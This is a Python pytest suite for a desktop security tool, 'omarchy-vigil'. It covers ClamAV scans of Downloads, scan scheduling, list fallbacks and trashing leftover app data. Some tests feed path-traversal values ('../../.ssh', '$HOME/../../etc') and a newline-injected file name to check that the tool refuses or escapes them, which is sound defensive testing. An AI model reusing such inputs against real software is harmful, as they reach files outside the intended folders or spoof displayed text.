    d = Path(v.HOME, "Downloads")
    (d / "old").mkdir(parents=True)
    old = d / "old" / "setup.exe"
    old.write_bytes(b"MZ old")
    os.utime(old, (time.time() - 5 * 86400, time.time() - 5 * 86400))
    new = d / "game.zip"
    new.write_bytes(b"PK new")
    (d / "link.exe").symlink_to("/etc/hostname")
    files = v.new_downloads(time.time() - 86400)
    # ctime cannot be set back in a test, so "old" may count by ctime; the link never does.
    assert str(new) in files and str(d / "link.exe") not in files
    v.COMMANDS[downloads_argv(v)] = (1, "%s: Win.Trojan.X-1 FOUND\n" % new)
    v.COMMANDS[confirm_argv([str(new)])] = (1, "%s: Win.Trojan.X-1 FOUND\n" % new)
    v.save_feed("virus-scan", {"found": [], "scanned": "~", "files": 10})
    v.refresh_downloads_scan()
    listed = Path(v.HOME, ".local/state/omarchy-vigil/downloads-scan.list").read_text().splitlines()
    assert str(new) in listed
    c = v.check_virus_scan()
    assert c["status"] == "fail" and "~/Downloads/game.zip" in c["detail"]
    new.unlink()                                                           # deleted (or quarantined in ClamUI)
    assert v.check_virus_scan()["status"] == "pass"


def test_xdg_download_dir_is_used_only_inside_home(v):
    put(Path(v.HOME, ".config/user-dirs.dirs"), 'XDG_DOWNLOAD_DIR="$HOME/Telechargements"\n')
    assert v.downloads_dir() == v.HOME + "/Telechargements"
    put(Path(v.HOME, ".config/user-dirs.dirs"), 'XDG_DOWNLOAD_DIR="$HOME/../../etc"\n')
    assert v.downloads_dir() == v.HOME + "/Downloads"
    put(Path(v.HOME, ".config/user-dirs.dirs"), 'XDG_DOWNLOAD_DIR="/etc"\n')
    assert v.downloads_dir() == v.HOME + "/Downloads"


def test_the_daily_run_gets_each_list_right_before_its_scan(v, capsys, monkeypatch):
    v.PROGRESS["on"] = True
    clamscan_ok(v)
    bee_installed(v)
    updates_tools(v)
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (2, "")
    ran = []
    monkeypatch.setattr(v, "refresh_bumblebee_list", lambda: (ran.append("list"), v.save_feed("bumblebee-list", {})))
    monkeypatch.setattr(v, "refresh_bumblebee", lambda: (ran.append("bumblebee"), v.save_feed("bumblebee", {})))
    monkeypatch.setattr(v, "refresh_downloads_scan",
                        lambda cb: (ran.append("downloads"), v.save_feed("downloads-scan", {"found": []})))
    monkeypatch.setattr(v, "refresh_virus_scan", lambda cb: ran.append("home-scan"))
    # The weekly check ran today; the daily check is due.
    for n in ("full-scan", "virus-scan"):
        v.save_feed(n, {})
    two_days = time.strftime("%Y-%m-%d", time.localtime(time.time() - 2 * 86400))
    put(Path(v.HOME, ".local/state/omarchy-vigil/bumblebee.json"),
        json.dumps({"at": two_days, "time": "08:00", "attempted": two_days, "findings": [], "status": "complete"}))
    v.refresh_due_feeds()
    steps = [json.loads(l)["progress"]["doing"] for l in capsys.readouterr().out.splitlines() if '"progress"' in l]
    assert ran == ["list", "bumblebee", "downloads"] and "home-scan" not in ran
    assert steps.index("Bumblebee list") + 1 == steps.index("Bumblebee scan")
    assert steps.index("Virus signatures") + 1 == steps.index("Virus scan of ~/Downloads")
    assert steps[0] == "System update lookup" and "Virus scan of ~" not in steps
    nxt = v.next_daily()
    assert nxt != "now" and nxt                                             # done: due again in a day
    v.PROGRESS["on"] = False


def test_a_failed_list_download_scans_with_the_last_good_list(v, monkeypatch):
    bee_installed(v)
    put(Path(v.HOME, ".local/state/omarchy-vigil", v.BUMBLEBEE_CATALOG), "{}")
    put(Path(v.HOME, ".local/state/omarchy-vigil/bumblebee-list.json"),
        json.dumps({"at": "2026-10-01", "time": "08:00", "attempted": "2026-10-01"}), 0o600)
    scanned, real_scan = [], v.refresh_bumblebee

    def fail():
        raise v.Refused("the list could not be downloaded")
    monkeypatch.setattr(v, "refresh_bumblebee_list", fail)
    monkeypatch.setattr(v, "refresh_bumblebee", lambda: scanned.append(1) or v.save_feed(
        "bumblebee", {"findings": [], "status": "complete", "used": ["2026-10-01", "08:00"],
                      "fallback": v.LIST_FALLBACK["bumblebee"]}))
    res = v.refresh_due_feeds(daily_only=True)
    assert scanned and "used the one from 2026-10-01" in res["message"]
    row = {s["id"]: s for s in v.source_status()}["bumblebee"]
    assert row["note"] == "with the list from Oct 1" and row["old"] is True
    assert v.check_bumblebee()["summary"].endswith(", with the list from Oct 1).")
    # No list at all: the scan cannot run, and says why.
    os.remove(v.home_path(*v.STATE_DIR, v.BUMBLEBEE_CATALOG))
    monkeypatch.setattr(v, "refresh_bumblebee", real_scan)
    res = v.refresh_due_feeds(daily_only=True)
    assert "Could not finish the Bumblebee list and the Bumblebee scan" in res["message"]


def test_a_full_scan_covers_the_daily_downloads_scan(v, monkeypatch):
    clamscan_ok(v)
    monkeypatch.setattr(v, "count_home_files", lambda **kw: 1)
    v.refresh_due_feeds(full=True)
    meta = json.loads(Path(v.HOME, ".local/state/omarchy-vigil/downloads-scan.json").read_text())
    assert meta["byFullScan"] is True and v.feed_due("downloads-scan") is False


def test_each_button_runs_its_own_schedule(v, monkeypatch):
    ran = []
    monkeypatch.setattr(v, "feed_available", lambda n: True)
    monkeypatch.setattr(v, "bumblebee_ok", lambda: True)
    monkeypatch.setattr(v, "can_ask_password", lambda: False)
    monkeypatch.setattr(v, "signatures_due", lambda: False)
    monkeypatch.setattr(v, "verify_signatures", lambda: "")
    monkeypatch.setattr(v, "flatpak_installations", lambda: [])
    monkeypatch.setattr(v, "exists", lambda p: True)
    for n in ("pending-updates", "flatpak", "arch-audit", "osv", "aur"):
        monkeypatch.setitem(v.FEED_REFRESH, n, lambda n=n: ran.append(n))
    for fn, n in (("refresh_bumblebee_list", "bumblebee-list"), ("refresh_bumblebee", "bumblebee"),
                  ("refresh_firmware", "firmware"), ("refresh_downloads_scan", "downloads-scan"),
                  ("refresh_virus_scan", "virus-scan")):
        monkeypatch.setattr(v, fn, lambda *a, n=n: ran.append(n))
    daily = ["pending-updates", "flatpak", "arch-audit", "osv", "aur", "bumblebee-list", "bumblebee"]
    v.refresh_due_feeds(daily_only=True)
    assert ran == daily + ["downloads-scan"]
    ran.clear()
    v.refresh_due_feeds(weekly_only=True)
    assert ran == ["firmware", "virus-scan"]
    ran.clear()
    # Run all: the daily check, then the weekly check; the scan of the home
    # folder covers Downloads, so Downloads is not scanned twice.
    v.refresh_due_feeds(full=True)
    assert ran == daily + ["firmware", "virus-scan"]
    # Every ClamAV scan comes right after the virus signatures, in every run.
    for kw in ({"daily_only": True}, {"weekly_only": True}, {"full": True}, {"scan_only": True}, {}):
        plan = v.run_plan(**kw)
        for scan in ("downloads-scan", "virus-scan"):
            if scan in plan:
                assert plan[plan.index(scan) - 1] == "signatures", (kw, plan)
        assert "bumblebee" not in plan or plan[plan.index("bumblebee") - 1] == "bumblebee-list"


def test_each_button_restarts_its_own_countdown(v, monkeypatch):
    from datetime import datetime, timedelta
    monkeypatch.setattr(v, "feed_available", lambda n: True)
    monkeypatch.setattr(v, "bumblebee_ok", lambda: True)
    monkeypatch.setattr(v, "can_ask_password", lambda: False)
    monkeypatch.setattr(v, "flatpak_installations", lambda: [])
    monkeypatch.setattr(v, "exists", lambda p: True)
    monkeypatch.setattr(v, "signatures_due", lambda: False)
    monkeypatch.setattr(v, "verify_signatures", lambda: "")
    for n in ("pending-updates", "flatpak", "arch-audit", "osv", "aur"):
        monkeypatch.setitem(v.FEED_REFRESH, n, lambda n=n: v.save_feed(n, {}))
    for fn, n in (("refresh_bumblebee_list", "bumblebee-list"), ("refresh_bumblebee", "bumblebee"),
                  ("refresh_firmware", "firmware"),
                  ("refresh_downloads_scan", "downloads-scan"), ("refresh_virus_scan", "virus-scan")):
        monkeypatch.setattr(v, fn, lambda *a, n=n: v.save_feed(n, {}))

    def at(s):
        return datetime.strptime(s, "%Y-%m-%d %H:%M")

    def near(s, days):
        return abs(at(s) - (datetime.now() + timedelta(days=days))) < timedelta(minutes=2)

    assert v.next_daily() == v.next_full_scan() == "now"                     # never ran
    v.refresh_due_feeds(daily_only=True)
    assert near(v.next_daily(), 1) and v.next_full_scan() == "now"
    v.refresh_due_feeds(weekly_only=True)
    assert near(v.next_full_scan(), 7)
    # Run all restarts both, the daily one included, though it does not
    # scan Downloads on its own (the scan of ~ covered it).
    for name in v.FEED_FILES:                                               # start over: nothing ran yet
        try:
            os.remove(v.home_path(*v.STATE_DIR, v.FEED_FILES[name]))
        except OSError:
            pass
    assert v.next_daily() == "now"
    v.refresh_due_feeds(full=True)
    assert near(v.next_daily(), 1) and near(v.next_full_scan(), 7)


def test_the_confirming_rescan_keeps_file_names_out_of_its_arguments(v):
    """/proc/<pid>/cmdline is readable by every account, so the paths of detected
    files go to clamscan in a private 0600 list, which is removed afterwards."""
    secret = Path(v.HOME, "Documents", "tax-2026", "bank statement.pdf.exe")
    put(secret, "x")
    found = [{"file": str(secret), "signature": "Win.Test.EICAR_HDB-1"}]
    v.COMMANDS[confirm_argv([str(secret)])] = (1, "%s: Win.Test.EICAR_HDB-1 FOUND\n" % secret)
    assert v.confirm_detections(found) == found
    (argv, listed, mode), = v.CONFIRM_SEEN
    assert not any(str(secret) in a or "tax-2026" in a for a in argv)
    assert listed == [str(secret)] and mode == 0o600
    assert not Path(v.HOME, *v.STATE_DIR, v.CONFIRM_LIST).exists()


# --------------------------------------------------------------------------
# Leftover app data

OLD = time.time() - 400 * 86400


def aged_tree(path, when=OLD):
    """Set a whole tree's times to `when`, children first, without following links."""
    path = Path(path)
    if path.is_dir() and not path.is_symlink():
        for child in path.iterdir():
            aged_tree(child, when)
    os.utime(path, (when, when), follow_symlinks=False)
    return path


def leftover_home(v):
    pkg = Path(v.ROOT, "var/lib/pacman/local")
    put(pkg / "signal-desktop-7.0-1" / "desc", "%NAME%\nsignal-desktop\n\n%PROVIDES%\nfoo-provider=1.0\n")
    put(pkg / "visual-studio-code-bin-1.0-1" / "desc", "%NAME%\nvisual-studio-code-bin\n")
    sysfile(v, "/usr/bin/brave", "")
    sysfile(v, "/usr/share/applications/code.desktop",
            "[Desktop Entry]\nExec=/usr/bin/code %F\nStartupWMClass=Code\n")
    for rel in (".config/Signal/config.json", ".config/BraveSoftware/x", ".config/Code/User/settings.json",
                ".config/foo-provider/rc", ".config/oldapp/rc", ".config/gtk-3.0/settings.ini",
                ".config/hypr/hyprland.conf", ".cargo/bin/x", ".oldtool/data", ".ssh/config",
                ".local/share/org.example.Gone/db", ".local/state/goneapp/log"):
        homefile(v, rel, "x")
    homefile(v, ".config/zapzap.conf", "x")
    for rel in (".config", ".cargo", ".oldtool", ".ssh", ".local/share/org.example.Gone", ".local/state/goneapp"):
        aged_tree(Path(v.HOME, rel))
    homefile(v, ".config/newapp/rc", "x")                                  # changed this month: in use
    os.symlink("/nowhere/dotfiles/stowed", os.path.join(v.HOME, ".config", "stowed"))   # a dotfile manager's link
    homefile(v, ".bashrc", 'export PATH="$HOME/.cargo/bin:$PATH"\n')
    homefile(v, ".var/app/com.spotify.Client/config/x", "x")                # Flatpak gone, even if recent
    homefile(v, ".var/app/org.mozilla.firefox/x", "x")
    Path(v.HOME, ".local/share/flatpak/app/org.mozilla.firefox").mkdir(parents=True)
    homefile(v, ".local/bin/real", "#!/bin/sh\n")
    os.symlink(os.path.join(v.HOME, ".local/bin/real"), os.path.join(v.HOME, ".local/bin/alive"))
    os.symlink("/opt/gone/bin/tool", os.path.join(v.HOME, ".local/bin/dead"))
    apps = ".local/share/applications/"
    homefile(v, apps + "gone.desktop", "[Desktop Entry]\nName=Gone\nExec=/opt/gone/app %U\n")
    homefile(v, apps + "spotify.desktop", "[Desktop Entry]\nExec=/usr/bin/flatpak run --branch=stable com.spotify.Client\n")
    homefile(v, apps + "webapp.desktop", "[Desktop Entry]\nExec=omarchy-launch-webapp https://example.com\n")
    homefile(v, apps + "firefox.desktop", "[Desktop Entry]\nExec=env A=1 flatpak run org.mozilla.firefox\n")


def shown(c):
    return sorted(i["text"].split(" \u00b7 ")[0] for i in c["items"])


def test_leftovers_lists_only_what_nothing_claims(v):
    leftover_home(v)
    c = v.check_leftovers()
    assert c["status"] == "info" and c["weight"] == 0 and c["category"] == "care"
    assert shown(c) == ["~/.config/oldapp", "~/.config/zapzap.conf", "~/.local/bin/dead",
                        "~/.local/share/applications/gone.desktop", "~/.local/share/applications/spotify.desktop",
                        "~/.local/share/org.example.Gone", "~/.local/state/goneapp", "~/.oldtool",
                        "~/.var/app/com.spotify.Client"]
    assert all(i["kind"] == "leftover" and i["kept"] is False and len(i["id"]) == 16 for i in c["items"])
    assert c["summary"].startswith("9 left behind by apps that are gone (")
    assert c["fix"] == {"kind": "docs", "action": "arch-xdg", "label": "Learn more"}
    assert "restore it from the trash" in c["howto"]
    row = next(x for x in v.audit(peek=True)["checks"] if x["id"] == "leftovers")
    assert row["dismissible"] is False                               # reviewed item by item, with Keep


def test_leftovers_says_so_when_nothing_is_left(v):
    c = v.check_leftovers()
    assert c["status"] == "pass" and c["summary"] == "Nothing left behind." and c["items"] == []


def test_keep_and_stop_keeping_change_only_vigils_notes(v):
    leftover_home(v)
    item = next(i for i in v.check_leftovers()["items"] if i["text"].startswith("~/.oldtool \u00b7"))
    assert v.set_kept(item["id"], True)["ok"] is True
    c = v.check_leftovers()
    assert c["summary"].startswith("8 left behind") and c["summary"].endswith(" 1 kept.")
    assert next(i for i in c["items"] if i["id"] == item["id"])["kept"] is True
    assert ".oldtool" not in c["detail"]
    assert Path(v.HOME, ".oldtool/data").exists()
    refused = v.trash_leftovers([item["id"]])
    assert refused["ok"] is False and "is kept (press Stop keeping first)" in refused["message"]
    assert Path(v.HOME, ".oldtool/data").exists()
    assert v.set_kept(item["id"], False)["message"] == "Counting it again."
    assert v.check_leftovers()["summary"].startswith("9 left behind")
    assert v.set_kept("0" * 16, True)["ok"] is False                           # not on the list


def test_trash_moves_into_the_freedesktop_trash(v):
    leftover_home(v)
    os.rename(os.path.join(v.HOME, ".config/oldapp"), os.path.join(v.HOME, ".config/old app\n%x"))
    c = v.check_leftovers()
    ids = {i["text"].split(" \u00b7 ")[0]: i["id"] for i in c["items"]}
    target = next(k for k in ids if k.startswith("~/.config/old app"))
    out = v.trash_leftovers([ids[target], ids["~/.local/bin/dead"]])
    assert out["ok"] is True and out["message"].startswith("Moved 2 items to the trash. To put one back")
    trash = Path(v.HOME, ".local/share/Trash")
    assert (trash / "files" / "old app\n%x" / "rc").read_text() == "x"
    assert (trash / "files" / "dead").is_symlink()                             # the link moved, not its target
    info = (trash / "info" / "old app\n%x.trashinfo").read_text()
    assert info.startswith("[Trash Info]\nPath=%s/.config/old%%20app%%0A%%25x\nDeletionDate=" % v.HOME)
    assert stat.S_IMODE((trash / "info" / "old app\n%x.trashinfo").stat().st_mode) == 0o600
    assert not Path(v.HOME, ".config/old app\n%x").exists()
    # A second item of the same name gets its own trash name.
    homefile(v, ".config/old app\n%x/rc", "y")
    aged_tree(Path(v.HOME, ".config/old app\n%x"))
    again = next(i["id"] for i in v.check_leftovers()["items"] if i["text"].startswith("~/.config/old app"))
    assert v.trash_leftovers([again])["ok"] is True
    assert (trash / "files" / "old app\n%x.2" / "rc").read_text() == "y"
    assert (trash / "info" / "old app\n%x.2.trashinfo").exists()
    assert v.trash_leftovers([again])["message"].startswith("Nothing was moved. Left where it was: one item is no longer")


def test_trash_checks_again_that_nothing_claims_it(v):
    leftover_home(v)
    lid = next(i["id"] for i in v.check_leftovers()["items"] if i["text"].startswith("~/.config/oldapp \u00b7"))
    put(Path(v.ROOT, "var/lib/pacman/local/oldapp-1-1/desc"), "%NAME%\noldapp\n")     # installed again since
    out = v.trash_leftovers([lid])
    assert out["ok"] is False and "no longer on the list" in out["message"]
    assert Path(v.HOME, ".config/oldapp/rc").exists()


def test_trash_refuses_a_link_on_the_way_and_moves_nothing(v, tmp_path):
    leftover_home(v)
    lid = next(i["id"] for i in v.check_leftovers()["items"] if i["text"].startswith("~/.local/state/goneapp \u00b7"))
    elsewhere = tmp_path / "elsewhere"
    os.rename(os.path.join(v.HOME, ".local/state"), elsewhere)
    os.symlink(elsewhere, os.path.join(v.HOME, ".local/state"))
    v.leftovers = lambda real=v.leftovers: real() + [{"id": lid, "parts": (".local", "state"), "name": "goneapp",
                                                      "shown": "~/.local/state/goneapp", "size": 0, "newest": 0,
                                                      "reason": "x"}]
    out = v.trash_leftovers([lid])
    assert out["ok"] is False and "not a real directory" in out["message"]
    assert (elsewhere / "goneapp" / "log").exists()


def test_trash_and_keep_take_only_ids(v, capsys):
    for argv in (["vigil", "trash", "../../.ssh"], ["vigil", "trash", "0" * 16, "0" * 16],
                 ["vigil", "keep", ".config/x"], ["vigil", "unkeep"], ["vigil", "trash"]):
        assert v.main(argv) == 2, argv
    assert v.main(["vigil", "trash", "0" * 16, "1" * 16]) == 0
    assert json.loads(capsys.readouterr().out.strip().splitlines()[-1])["ok"] is False


def test_trash_never_moves_the_folders_that_hold_the_trash(v):
    homefile(v, ".local/share/Trash/files/keep", "x")
    for parts, name in (((), ".local"), ((".local",), "share"), ((".local", "share"), "Trash")):
        with pytest.raises(v.Refused):
            v.move_to_trash(parts, name)
    assert Path(v.HOME, ".local/share/Trash/files/keep").exists()


def test_bumblebee_names_its_list_only_when_the_download_failed(v, monkeypatch):
    """The list is downloaded right before every scan, so it is always the
    newest and not mentioned; only a scan that fell back to the last good list
    says which one it used."""
    bee_installed(v)
    put(Path(v.HOME, ".local/state/omarchy-vigil", v.BUMBLEBEE_CATALOG), "{}")
    v.COMMANDS[(v.BUMBLEBEE_BIN, "scan", "--profile", "baseline", "--exposure-catalog",
                v.home_path(*v.STATE_DIR, v.BUMBLEBEE_CATALOG), "--findings-only", "--output", "stdout",
                "--max-duration", "5m")] = (0, '{"record_type": "scan_summary", "status": "complete"}\n')
    monkeypatch.setattr(v, "refresh_bumblebee_list", lambda: v.save_feed("bumblebee-list", {}))
    v.refresh_due_feeds(daily_only=True)
    assert {s["id"]: s for s in v.source_status()}["bumblebee"]["note"] == ""
    assert "with the list" not in v.check_bumblebee()["summary"]


def test_the_downloads_scan_says_which_signatures_even_with_nothing_new(v):
    clamscan_ok(v)
    v.refresh_due_feeds(daily_only=True)                                   # no new downloads
    row = {s["id"]: s for s in v.source_status()}["downloads-scan"]
    assert row["note"] == "with signatures from " + time.strftime("%b %-d") and row["old"] is False


def test_system_logs_are_tidy_under_500_mb(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/journalctl")
    for size, status in (("172.6M", "pass"), ("499.9M", "pass"), ("512.0K", "pass"), ("500.0M", "info"),
                         ("1.2G", "info")):
        v.COMMANDS[("/usr/bin/journalctl", "--disk-usage")] = (
            0, "Archived and active journals take up %s in the file system." % size)
        c = v.check_journal()
        assert c["status"] == status and c["summary"] == "Logs take up %s." % size, size
        assert (c["fix"]["action"] == "clean-journal") == (status == "info"), size   # no cleanup, not in Clean all


def test_keep_and_stop_keeping_take_several_at_once(v, capsys):
    leftover_home(v)
    ids = [i["id"] for i in v.check_leftovers()["items"]][:3]
    assert v.set_kept(ids, True)["message"] == "Kept 3 items. They stay where they are and Vigil stops counting them."
    assert sum(i["kept"] for i in v.check_leftovers()["items"]) == 3
    assert v.set_kept(ids[:2], False)["message"] == "Counting 2 items again."
    assert v.main(["vigil", "keep"] + ids) == 0
    assert v.main(["vigil", "keep", ids[0], ids[0]]) == 2                  # each id once
    assert v.set_kept(["0" * 16], True)["ok"] is False                      # not on the list



def test_a_leftover_reads_as_two_lines_and_a_name_cannot_add_one(v):
    leftover_home(v)
    os.rename(os.path.join(v.HOME, ".config/oldapp"), os.path.join(v.HOME, ".config/evil\nno installed app"))
    texts = {i["text"].split("\n")[0].split(" · ")[0]: i["text"] for i in v.check_leftovers()["items"]}
    old = texts["~/.oldtool"]
    assert re.fullmatch(r"~/\.oldtool · [0-9.]+ [KMG]?B\nno installed app uses it · unchanged since \d{4}-\d{2}", old)
    assert texts["~/.var/app/com.spotify.Client"].split("\n")[1] == "data of a Flatpak app that is no longer installed"
    evil = texts["~/.config/evil\\nno installed app"]                       # escaped, still two lines
    assert evil.count("\n") == 1
